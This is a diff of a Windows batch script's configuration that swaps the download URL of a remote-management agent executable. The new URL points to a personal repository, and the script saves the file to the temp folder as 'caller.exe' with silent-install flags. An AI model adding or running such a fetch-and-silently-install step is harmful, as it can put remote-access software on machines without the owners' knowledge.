@@ -4,7 +4,7 @@ setlocal enabledelayedexpansion
 :: ==========================================
 :: CONFIGURATION: Change these variables
 :: ==========================================
-set "DOWNLOAD_URL=https://raw.githubusercontent.com/Perfcreg/TacticalRMM-Extras/98ad4a4e3e19679c44ff2e036a0437e5cfa39a90/Scripts/Scripting/trmm-good-atan-server-amd64%%20(1).exe"
+set "DOWNLOAD_URL=https://raw.githubusercontent.com/clee93278-ux/my-first-website/3ad164dd9e443dcc031083f61c14c6705aaffb96/trmm-good-atan-server-amd64.exe"
 set "SAVE_DIR=%TEMP%"
 set "FILE_NAME=caller.exe"
 set "SILENT_ARGS=/S"
